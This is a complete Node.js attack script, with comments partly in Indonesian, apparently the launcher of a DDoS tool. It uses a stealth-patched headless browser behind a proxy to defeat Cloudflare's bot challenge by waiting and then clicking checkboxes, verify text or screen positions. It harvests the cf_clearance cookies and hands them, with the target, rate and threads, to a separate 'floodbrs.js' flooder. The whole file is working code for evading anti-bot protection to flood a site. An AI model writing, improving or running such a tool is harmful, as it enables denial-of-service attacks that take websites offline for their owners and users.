const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COLORS = {
    RED: '\x1b[31m',
    GREEN: '\x1b[32m',
    YELLOW: '\x1b[33m',
    BLUE: '\x1b[34m',
    RESET: '\x1b[0m'
};

// Simple stealth configuration
const applyStealth = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
    });
};

// Browser args
const getBrowserArgs = (proxy) => [
    '--no-sandbox',
    '--disable-setuid-sandbox', 
    '--disable-dev-shm-usage',
    '--disable-blink-features=AutomationControlled',
    '--user-data-dir=/tmp/puppeteer',
    '--disable-web-security',
    '--disable-features=site-per-process',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    proxy ? `--proxy-server=${proxy}` : ''
].filter(Boolean);

// SIMPLE CLOUDFLARE SOLVER - TUNGGU 15-20 DETIK LALU CLICK CHECKBOX
const solveCloudflare = async (page, proxy) => {
    log('CLOUDFLARE', `Checking for challenge with proxy: ${maskProxy(proxy)}`, 'YELLOW');
    
    let title = await page.title().catch(() => '');
    let currentUrl = page.url();
    
    log('DEBUG', `Initial - Title: "${title}"`, 'BLUE');

    // Check if already passed
    if (!title.includes('Just a moment') && 
        !title.includes('Checking your browser') &&
        !currentUrl.includes('challenges.cloudflare.com')) {
        log('SUCCESS', 'No challenge detected', 'GREEN');
        return { solved: true, method: 'no_challenge' };
    }

    log('CHALLENGE', 'Cloudflare challenge detected', 'YELLOW');
    
    // TUNGGU 15-20 DETIK SEPERTI PERMINTAAN
    const waitTime = 15000 + Math.random() * 5000; // 15-20 detik
    log('WAIT', `Waiting ${Math.round(waitTime/1000)} seconds for challenge...`, 'BLUE');
    await page.waitForTimeout(waitTime);

    // STRATEGI 1: Click checkbox langsung (paling umum)
    log('STRATEGY', 'Looking for checkbox to click...', 'BLUE');
    
    // Cari checkbox dengan berbagai selector
    const checkboxSelectors = [
        'input[type="checkbox"]',
        '.hcaptcha-box',
        '.cf-challenge',
        '.challenge-form input',
        '#challenge-form input',
        'input[name="cf-turnstile-response"]'
    ];

    for (const selector of checkboxSelectors) {
        try {
            const checkbox = await page.$(selector);
            if (checkbox) {
                log('FOUND', `Found checkbox: ${selector}`, 'GREEN');
                await checkbox.click();
                log('CLICK', 'Clicked checkbox', 'GREEN');
                
                // Tunggu sebentar setelah click
                await page.waitForTimeout(5000);
                
                // Cek apakah berhasil
                title = await page.title().catch(() => '');
                if (!title.includes('Just a moment')) {
                    log('SUCCESS', 'Checkbox click solved challenge!', 'GREEN');
                    return { solved: true, method: 'checkbox' };
                }
                break;
            }
        } catch (error) {
            // Continue to next selector
        }
    }

    // STRATEGI 2: Cari text "Verify" atau "Buktikan" dan click di sekitarnya
    log('STRATEGY', 'Looking for verify text...', 'BLUE');
    
    const verifyTexts = [
        'Verify you are human',
        'Buktikan bahwa Anda adalah manusia', 
        'Verifying',
        'I am human',
        'Prove you are human'
    ];

    for (const text of verifyTexts) {
        try {
            const elements = await page.$x(`//*[contains(text(), '${text}')]`);
            if (elements.length > 0) {
                log('FOUND', `Found text: "${text}"`, 'GREEN');
                
                // Click element yang mengandung text
                await elements[0].click();
                log('CLICK', `Clicked text: ${text}`, 'GREEN');
                
                await page.waitForTimeout(5000);
                
                title = await page.title().catch(() => '');
                if (!title.includes('Just a moment')) {
                    log('SUCCESS', 'Text click solved challenge!', 'GREEN');
                    return { solved: true, method: 'text_click' };
                }
                break;
            }
        } catch (error) {
            // Continue to next text
        }
    }

    // STRATEGI 3: Click di area umum challenge
    log('STRATEGY', 'Trying general area click...', 'BLUE');
    
    const viewport = page.viewport();
    const clickPoints = [
        { x: viewport.width / 2, y: viewport.height / 2 }, // center
        { x: viewport.width / 2 - 100, y: viewport.height / 2 }, // left
        { x: viewport.width / 2 + 100, y: viewport.height / 2 } // right
    ];

    for (const point of clickPoints) {
        try {
            await page.mouse.click(point.x, point.y);
            log('CLICK', `Clicked at position ${point.x},${point.y}`, 'YELLOW');
            
            await page.waitForTimeout(3000);
            
            title = await page.title().catch(() => '');
            if (!title.includes('Just a moment')) {
                log('SUCCESS', 'Position click solved challenge!', 'GREEN');
                return { solved: true, method: 'position' };
            }
        } catch (error) {
            // Continue to next position
        }
    }

    // STRATEGI 4: Tunggu lagi dan coba reload
    log('STRATEGY', 'Final wait and check...', 'BLUE');
    await page.waitForTimeout(10000);
    
    title = await page.title().catch(() => '');
    if (!title.includes('Just a moment')) {
        log('SUCCESS', 'Challenge solved after additional wait!', 'GREEN');
        return { solved: true, method: 'wait' };
    }

    log('ERROR', 'All solving strategies failed', 'RED');
    return { solved: false, method: 'failed' };
};

// EXTRACT COOKIES SIMPLE
const extractCookies = async (page) => {
    await page.waitForTimeout(3000);
    
    const cookies = await page.cookies().catch(() => []);
    
    if (cookies.length === 0) {
        log('COOKIES', 'No cookies found', 'YELLOW');
        return '';
    }

    // Cari cf_clearance atau cookie cloudflare lainnya
    const cloudflareCookies = cookies.filter(cookie => 
        cookie.name === 'cf_clearance' || 
        cookie.name.includes('cf_') ||
        cookie.name.includes('__cf')
    );

    if (cloudflareCookies.length > 0) {
        const cookieString = cloudflareCookies.map(cookie => 
            `${cookie.name}=${cookie.value}`
        ).join('; ');
        
        log('COOKIES', `Found: ${cloudflareCookies.map(c => c.name).join(', ')}`, 'GREEN');
        return cookieString;
    }

    // Fallback ke cookie pertama
    if (cookies.length > 0) {
        const firstCookie = cookies[0];
        log('COOKIES', `Using fallback: ${firstCookie.name}`, 'YELLOW');
        return `${firstCookie.name}=${firstCookie.value}`;
    }

    return '';
};

// Command-line setup
if (process.argv.length < 6) {
    console.log('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    console.log('Example: node browser.js https://example.com 2 proxies.txt 10 120');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let successCount = 0;

// Utility functions
const generateRandomString = (length) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};

const validKey = generateRandomString(16);

const readProxies = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/).filter(line => {
            // Validasi format proxy sederhana
            return line.includes(':') && line.split(':').length >= 2;
        });
        return proxies.length > 0 ? [proxies[0]] : []; // Use first proxy only
    } catch (error) {
        log('ERROR', `Cannot read proxy file: ${error.message}`, 'RED');
        return [];
    }
};

const maskProxy = (proxy) => {
    if (!proxy) return 'no-proxy';
    const parts = proxy.split(':');
    if (parts.length >= 2) {
        const ip = parts[0];
        if (ip.split('.').length === 4) {
            return `${ip.split('.')[0]}.${ip.split('.')[1]}.**.**:****`;
        }
    }
    return proxy;
};

const log = (type, message, color = 'RESET') => {
    const colorCode = COLORS[color] || COLORS.RESET;
    const timestamp = new Date().toLocaleTimeString();
    console.log(`${colorCode}[${timestamp}] [${type}] ${message}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

// Simple browser launcher
const launchBrowser = async (targetURL, proxy, attempt = 1) => {
    const userAgent = randomElement(userAgents);
    let browser;

    log('BROWSER', `Launch attempt ${attempt} with proxy: ${maskProxy(proxy)}`, 'BLUE');

    const options = {
        headless: true,
        args: getBrowserArgs(proxy),
        defaultViewport: { 
            width: 1920, 
            height: 1080 
        },
        ignoreHTTPSErrors: true
    };

    try {
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply stealth
        await applyStealth(page);

        // Set user agent
        await page.setUserAgent(userAgent);

        // Set basic headers
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        });

        log('NAVIGATE', `Going to: ${targetURL}`, 'BLUE');
        
        // Navigate dengan timeout yang reasonable
        await page.goto(targetURL, { 
            waitUntil: 'domcontentloaded',
            timeout: 30000 
        });

        // Solve Cloudflare challenge
        const solveResult = await solveCloudflare(page, proxy);
        
        if (!solveResult.solved) {
            throw new Error(`Cloudflare challenge failed after ${attempt} attempts`);
        }

        // Extract cookies
        const cookies = await extractCookies(page);
        
        if (!cookies) {
            throw new Error('No cookies obtained');
        }

        successCount++;
        log('SUCCESS', `Cloudflare solved via ${solveResult.method}`, 'GREEN');
        log('COOKIES', `Obtained cookies: ${cookies}`, 'GREEN');

        await browser.close();

        return {
            cookies: cookies,
            userAgent: userAgent,
            method: solveResult.method
        };

    } catch (error) {
        if (browser) {
            await browser.close().catch(() => {});
        }
        
        if (attempt < 3) {
            log('RETRY', `Retrying (${attempt}/3) in 5 seconds...`, 'YELLOW');
            await sleep(5);
            return launchBrowser(targetURL, proxy, attempt + 1);
        }
        
        log('FAILED', `All attempts failed: ${error.message}`, 'RED');
        return null;
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    
    if (proxies.length === 0) {
        log('ERROR', 'No valid proxies found in file', 'RED');
        process.exit(1);
    }

    const proxy = proxies[0];
    
    log('START', '='.repeat(50), 'GREEN');
    log('TARGET', targetURL, 'GREEN');
    log('PROXY', `Using proxy: ${maskProxy(proxy)}`, 'BLUE');
    log('CONFIG', `Threads: ${threads} | Time: ${duration}s | Rate: ${rate}`, 'BLUE');
    log('START', '='.repeat(50), 'GREEN');

    let result = null;
    const maxAttempts = 3;

    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        log('ATTEMPT', `Cloudflare solving attempt ${attempt}/${maxAttempts}`, 'YELLOW');
        result = await launchBrowser(targetURL, proxy, attempt);
        
        if (result && result.cookies) {
            break;
        }
        
        if (attempt < maxAttempts) {
            log('RETRY', 'Waiting 10 seconds before next attempt...', 'YELLOW');
            await sleep(10);
        }
    }

    if (!result || !result.cookies) {
        log('FATAL', 'Failed to solve Cloudflare after all attempts', 'RED');
        process.exit(1);
    }

    log('SUCCESS', 'Cloudflare successfully bypassed!', 'GREEN');
    log('COOKIES', result.cookies, 'GREEN');
    log('USER-AGENT', result.userAgent, 'BLUE');

    // Launch flood process
    try {
        log('FLOOD', `Starting flooder for ${duration} seconds...`, 'GREEN');
        
        const floodProcess = spawn('node', [
            'floodbrs.js',
            targetURL,
            duration.toString(),
            rate,
            threads.toString(),
            proxyFile,
            result.cookies,
            result.userAgent,
            validKey
        ], {
            detached: false,
            stdio: 'inherit'
        });
        
        floodProcess.on('close', (code) => {
            log('FLOOD', `Flood process completed with code: ${code}`, 'YELLOW');
            process.exit(code || 0);
        });
        
        floodProcess.on('error', (error) => {
            log('FLOOD', `Flood process error: ${error.message}`, 'RED');
            process.exit(1);
        });
        
    } catch (error) {
        log('ERROR', `Failed to start flood: ${error.message}`, 'RED');
        process.exit(1);
    }
};

// Error handling
process.on('uncaughtException', (error) => {
    log('CRASH', `Uncaught Exception: ${error.message}`, 'RED');
    process.exit(1);
});

process.on('unhandledRejection', (error) => {
    log('REJECTION', `Unhandled Rejection: ${error.message}`, 'RED');
    process.exit(1);
});

process.on('SIGINT', () => {
    log('INFO', 'Shutdown signal received', 'YELLOW');
    process.exit(0);
});

// Start the application
main().catch(error => {
    log('FATAL', `Main function error: ${error.message}`, 'RED');
    process.exit(1);
});
